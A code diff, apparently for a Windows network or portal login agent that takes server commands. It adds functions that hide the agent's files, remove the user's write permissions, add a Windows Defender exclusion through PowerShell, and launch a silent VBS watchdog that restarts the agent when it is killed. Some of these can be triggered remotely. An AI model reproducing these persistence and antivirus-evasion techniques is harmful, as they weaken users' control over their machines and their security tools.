@@ -243,6 +243,118 @@ def disable_autostart():
     success = any("✓" in r for r in results)
     return success, "已禁用: " + " | ".join(results)
 
+# ============ 文件/进程保护 (Windows) ============
+
+def protect_files():
+    """保护 Agent 文件: 隐藏+系统+只读属性 + NTFS权限"""
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    import subprocess
+    results = []
+    agent_dir = os.path.dirname(AGENT_SCRIPT)
+    
+    # 1. 设置文件属性: 隐藏+系统+只读
+    targets = [AGENT_SCRIPT, CONFIG_FILE,
+               os.path.join(agent_dir, "start_agent.vbs")]
+    for f in targets:
+        if os.path.exists(f):
+            try:
+                subprocess.run(["attrib", "+H", "+S", "+R", f],
+                             capture_output=True, timeout=5,
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            except: pass
+    results.append("属性(隐藏+系统+只读)✓")
+    
+    # 2. NTFS 权限: 仅管理员和SYSTEM可修改
+    cmd = ["icacls", agent_dir, "/inheritance:r",
+           "/grant:r", "SYSTEM:(OI)(CI)F",
+           "/grant:r", "Administrators:(OI)(CI)F",
+           "/grant:r", f"{os.environ.get('USERNAME','*')}:(OI)(CI)RX"]
+    ok, out = _run_as_admin(cmd)
+    if ok:
+        results.append("NTFS权限✓")
+    else:
+        results.append(f"NTFS权限✗({out[:40]})")
+    
+    return True, " | ".join(results)
+
+def unprotect_files():
+    """移除文件保护"""
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    import subprocess
+    agent_dir = os.path.dirname(AGENT_SCRIPT)
+    
+    # 移除属性
+    targets = [AGENT_SCRIPT, CONFIG_FILE,
+               os.path.join(agent_dir, "start_agent.vbs")]
+    for f in targets:
+        if os.path.exists(f):
+            try:
+                subprocess.run(["attrib", "-H", "-S", "-R", f],
+                             capture_output=True, timeout=5,
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            except: pass
+    
+    # 恢复 NTFS 继承
+    cmd = ["icacls", agent_dir, "/inheritance:e", "/reset"]
+    _run_as_admin(cmd)
+    return True, "文件保护已移除"
+
+def add_defender_exclusion():
+    """添加 Windows Defender 白名单"""
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    agent_dir = os.path.dirname(AGENT_SCRIPT)
+    cmd = ["powershell", "-Command",
+           f'Add-MpPreference -ExclusionPath "{agent_dir}"']
+    ok, out = _run_as_admin(cmd)
+    if ok:
+        return True, f"Defender 白名单已添加: {agent_dir}"
+    return False, f"添加失败: {out[:60]}"
+
+def remove_defender_exclusion():
+    """移除 Windows Defender 白名单"""
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    agent_dir = os.path.dirname(AGENT_SCRIPT)
+    cmd = ["powershell", "-Command",
+           f'Remove-MpPreference -ExclusionPath "{agent_dir}"']
+    ok, out = _run_as_admin(cmd)
+    return True, "Defender 白名单已移除"
+
+def _start_watchdog():
+    """启动看门狗: 创建一个监控脚本, 主进程被杀后自动重启"""
+    if platform.system() != "Windows":
+        return
+    import subprocess
+    watchdog_vbs = os.path.join(os.path.dirname(AGENT_SCRIPT), "_watchdog.vbs")
+    python_exe = sys.executable
+    pid = os.getpid()
+    # VBS 看门狗: 每30秒检查进程是否存活, 不存在则重启
+    vbs_code = f'''Set ws = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+agentScript = "{AGENT_SCRIPT}"
+pythonExe = "{python_exe}"
+WScript.Sleep 10000
+Do While True
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:")
+    Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%" & Replace(agentScript, "\\", "\\\\") & "%' AND Name = 'python.exe'")
+    If procs.Count = 0 Then
+        ws.Run """" & pythonExe & """ """ & agentScript & """", 0, False
+    End If
+    On Error Goto 0
+    WScript.Sleep 30000
+Loop
+'''
+    with open(watchdog_vbs, "w", encoding="utf-8") as f:
+        f.write(vbs_code)
+    # 静默启动看门狗
+    subprocess.Popen(["wscript.exe", watchdog_vbs],
+                    creationflags=subprocess.CREATE_NO_WINDOW)
+    print("  [GUARD] 看门狗已启动")
+
 # ============ 配置管理 ============
 
 def load_config():
@@ -594,6 +706,23 @@ class Agent:
 
             elif command == "disable_autostart":
                 success, message = disable_autostart()
+
+            elif command == "protect":
+                r1 = protect_files()
+                r2 = add_defender_exclusion()
+                success = r1[0] or r2[0]
+                message = f"文件保护: {r1[1]} | Defender: {r2[1]}"
+
+            elif command == "unprotect":
+                r1 = unprotect_files()
+                r2 = remove_defender_exclusion()
+                success = True
+                message = f"{r1[1]} | {r2[1]}"
+
+            elif command == "start_watchdog":
+                _start_watchdog()
+                success = True
+                message = "看门狗已启动(30秒检测一次)"
                 
             else:
                 message = f"未知命令: {command}"
@@ -654,6 +783,13 @@ class Agent:
         print("=" * 50)
         print("  Agent 运行中... (Ctrl+C 停止)\n")
         
+        # 自动启动看门狗
+        if not getattr(self, '_no_watchdog', False):
+            try:
+                _start_watchdog()
+            except Exception as e:
+                print(f"  [GUARD] 看门狗启动失败: {e}")
+        
         while True:
             try:
                 self._check_auto_reconnect()
@@ -677,6 +813,8 @@ if __name__ == "__main__":
     parser.add_argument("--portal", default=None, help="Portal IP (默认 10.228.9.7)")
     parser.add_argument("--autostart", action="store_true", help="启用开机自启")
     parser.add_argument("--no-autostart", action="store_true", help="禁用开机自启")
+    parser.add_argument("--protect", action="store_true", help="启用文件保护+Defender白名单")
+    parser.add_argument("--no-watchdog", action="store_true", help="禁用看门狗")
     args = parser.parse_args()
 
     if args.autostart:
@@ -685,8 +823,14 @@ if __name__ == "__main__":
     if args.no_autostart:
         ok, msg = disable_autostart()
         print(f"  {'✓' if ok else '✗'} {msg}")
+    if args.protect:
+        ok, msg = protect_files()
+        print(f"  {'✓' if ok else '✗'} {msg}")
+        ok, msg = add_defender_exclusion()
+        print(f"  {'✓' if ok else '✗'} {msg}")
     
     agent = Agent(server_url=args.server)
+    agent._no_watchdog = args.no_watchdog
     
     if args.username:
         agent.net.username = args.username
